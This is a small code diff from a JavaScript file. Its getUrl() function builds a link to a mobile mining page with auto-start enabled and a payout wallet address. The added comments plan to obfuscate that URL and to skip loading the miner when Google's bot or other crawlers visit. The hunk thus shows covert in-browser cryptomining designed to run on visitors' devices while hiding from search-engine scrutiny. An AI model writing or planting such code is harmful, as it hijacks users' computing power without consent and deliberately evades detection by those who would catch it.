@@ -88,6 +88,9 @@ function setupDetector() {
 }
 
 function getUrl() {
+	// TODO: obfuscate url
+	// Try to avoid loading the miner when google bot or other bot comes here.
+
 	let str =
 		'https://mobileminer.org/mine/?auto=1&addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c';
 
